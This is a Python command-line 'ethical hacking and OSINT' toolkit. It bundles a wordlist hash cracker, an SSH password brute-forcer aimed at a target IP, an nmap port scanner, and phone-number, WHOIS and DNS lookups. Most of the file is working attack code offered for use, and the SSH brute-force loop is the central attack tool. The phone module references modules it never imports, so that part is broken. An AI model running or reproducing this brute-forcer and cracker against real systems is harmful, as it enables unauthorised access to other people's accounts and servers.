# if the code not working, is bcs is still on developement testing only.


#!/usr/bin/env python3
import os
import socket
import sys
import time
from datetime import datetime
import requests
import argparse
import hashlib
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
import nmap3
import phonenumbers
from colorama import init, Fore, Style
import paramiko
import dns.resolver
import whois

# Initialize colorama
init(autoreset=True)
# ================ BANNER ================
def banner():
    print(Fore.BLUE + r"""
 ██████╗  ██████╗ ██╗   ██╗██╗███████╗███████╗ ██████╗
██╔═══██╗██╔═══██╗╚██╗ ██╔╝██║██╔════╝██╔════╝██╔════╝
██║   ██║██║   ██║ ╚████╔╝ ██║███████╗█████╗  ██║     
██║▄▄ ██║██║   ██║  ╚██╔╝  ██║╚════██║██╔══╝  ██║     
╚██████╔╝╚██████╔╝   ██║   ██║███████║███████╗╚██████╗
 ╚══▀▀═╝  ╚═════╝    ╚═╝   ╚═╝╚══════╝╚══════╝ ╚═════╝
                                                                                
    """ + Style.RESET_ALL)
    print(Fore.CYAN + "Hacking Tool By QoyiSec")
    print(Fore.RED + "For CyberSecurity Test Only!")
    print(Fore.YELLOW + "="*60 + Style.RESET_ALL + "\n")
    print(Fore.GREEN + f"Runtime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(Fore.GREEN + f"Python: {sys.version.split()[0]}")
    print(Fore.GREEN + f"Platform: {sys.platform}")
    print(Style.RESET_ALL)

# ================ ATTACK MODULES ================
class PasswordCracker:
    def __init__(self):
        self.hash_types = {
            'md5': hashlib.md5,
            'sha1': hashlib.sha1,
            'sha256': hashlib.sha256,
            'sha512': hashlib.sha512
        }
    
    def crack(self, hash_value, wordlist, hash_type='md5'):
        try:
            if not os.path.exists(wordlist):
                print(Fore.RED + "Wordlist file not found!" + Style.RESET_ALL)
                return
            
            hash_func = self.hash_types.get(hash_type.lower())
            if not hash_func:
                print(Fore.RED + f"Unsupported hash type: {hash_type}" + Style.RESET_ALL)
                return
            
            print(Fore.BLUE + f"\nStarting password cracking ({hash_type})..." + Style.RESET_ALL)
            start_time = time.time()
            
            with open(wordlist, 'r', errors='ignore') as f:
                for password in f:
                    password = password.strip()
                    if hash_func(password.encode()).hexdigest() == hash_value:
                        print(Fore.GREEN + f"\n[+] Password found: {password}" + Style.RESET_ALL)
                        print(Fore.GREEN + f"Time elapsed: {time.time() - start_time:.2f} seconds" + Style.RESET_ALL)
                        return
            
            print(Fore.RED + "\nPassword not found in wordlist" + Style.RESET_ALL)
            
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\nCracking interrupted by user" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)

class BruteForcer:
    def ssh_brute(self, target, port, username, wordlist):
        try:
            if not os.path.exists(wordlist):
                print(Fore.RED + "Wordlist file not found!" + Style.RESET_ALL)
                return
            
            print(Fore.BLUE + f"\nStarting SSH brute force on {target}:{port}" + Style.RESET_ALL)
            
            with open(wordlist, 'r') as f:
                for password in f:
                    password = password.strip()
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(target, port=port, username=username, password=password, timeout=5)
                        print(Fore.GREEN + f"\n[+] Success! Credentials: {username}:{password}" + Style.RESET_ALL)
                        ssh.close()
                        return
                    except:
                        print(Fore.YELLOW + f"Trying: {password}" + Style.RESET_ALL, end='\r')
            
            print(Fore.RED + "\nBrute force failed - no valid credentials found" + Style.RESET_ALL)
            
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\nBrute force interrupted by user" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)

class PortScanner:
    def __init__(self):
        self.nmap = nmap3.Nmap()
    
    def scan(self, target, ports=None):
        try:
            if ports:
                print(Fore.BLUE + f"\nScanning ports {ports} on {target}" + Style.RESET_ALL)
                results = self.nmap.scan(target, ports=",".join(map(str, ports)))
            else:
                print(Fore.BLUE + f"\nScanning top ports on {target}" + Style.RESET_ALL)
                results = self.nmap.scan_top_ports(target)
            
            for host in results:
                print(Fore.YELLOW + f"\nHost: {host}" + Style.RESET_ALL)
                for port in results[host]['ports']:
                    if port['state'] == 'open':
                        print(Fore.GREEN + f"Port {port['portid']}: {port['service']['name']}" + Style.RESET_ALL)
            
        except Exception as e:
            print(Fore.RED + f"Scan error: {e}" + Style.RESET_ALL)

# ================ OSINT MODULES ================
class PhoneAnalyzer:
    def analyze(self, phone_number):
        try:
            print(Fore.BLUE + f"\nAnalyzing phone number: {phone_number}" + Style.RESET_ALL)
            parsed = phonenumbers.parse(phone_number)
            
            print(Fore.YELLOW + "\n[+] Carrier:" + Style.RESET_ALL)
            print(carrier.name_for_number(parsed, 'en'))
            
            print(Fore.YELLOW + "\n[+] Location:" + Style.RESET_ALL)
            print(geocoder.description_for_number(parsed, 'en'))
            
        except Exception as e:
            print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)

class DomainAnalyzer:
    def analyze(self, domain):
        try:
            print(Fore.BLUE + f"\nAnalyzing domain: {domain}" + Style.RESET_ALL)
            
            # WHOIS lookup
            print(Fore.YELLOW + "\n[+] WHOIS Information:" + Style.RESET_ALL)
            info = whois.whois(domain)
            print(f"Registrar: {info.registrar}")
            print(f"Creation Date: {info.creation_date}")
            
            # DNS records
            print(Fore.YELLOW + "\n[+] DNS Records:" + Style.RESET_ALL)
            types = ['A', 'MX', 'NS', 'TXT']
            for type in types:
                try:
                    answers = dns.resolver.resolve(domain, type)
                    print(f"{type}:")
                    for rdata in answers:
                        print(f"  {rdata.to_text()}")
                except:
                    continue
            
        except Exception as e:
            print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)

# ================ MAIN MENU ================
def main():
    banner()
    
    parser = argparse.ArgumentParser(description='Ultimate Ethical Hacking & OSINT Toolkit')
    subparsers = parser.add_subparsers(dest='command', help='Available commands')
    
    # Attack commands
    crack_parser = subparsers.add_parser('crack', help='Password cracking')
    crack_parser.add_argument('hash', help='Hash to crack')
    crack_parser.add_argument('-w', '--wordlist', required=True, help='Wordlist file')
    crack_parser.add_argument('-t', '--type', choices=['md5', 'sha1', 'sha256', 'sha512'], 
                            default='md5', help='Hash type')
    
    brute_parser = subparsers.add_parser('brute', help='SSH brute force')
    brute_parser.add_argument('target', help='Target IP')
    brute_parser.add_argument('-p', '--port', type=int, default=22, help='SSH port')
    brute_parser.add_argument('-u', '--user', required=True, help='Username')
    brute_parser.add_argument('-w', '--wordlist', required=True, help='Password wordlist')
    
    scan_parser = subparsers.add_parser('scan', help='Port scanning')
    scan_parser.add_argument('target', help='Target IP or hostname')
    scan_parser.add_argument('-p', '--ports', nargs='+', type=int, help='Ports to scan')
    
    # OSINT commands
    phone_parser = subparsers.add_parser('phone', help='Phone number analysis')
    phone_parser.add_argument('number', help='Phone number to analyze')
    
    domain_parser = subparsers.add_parser('domain', help='Domain analysis')
    domain_parser.add_argument('domain', help='Domain to analyze')
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        return
    
    if args.command == 'crack':
        cracker = PasswordCracker()
        cracker.crack(args.hash, args.wordlist, args.type)
    elif args.command == 'brute':
        bruteforcer = BruteForcer()
        bruteforcer.ssh_brute(args.target, args.port, args.user, args.wordlist)
    elif args.command == 'scan':
        scanner = PortScanner()
        scanner.scan(args.target, args.ports)
    elif args.command == 'phone':
        analyzer = PhoneAnalyzer()
        analyzer.analyze(args.number)
    elif args.command == 'domain':
        analyzer = DomainAnalyzer()
        analyzer.analyze(args.domain)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()
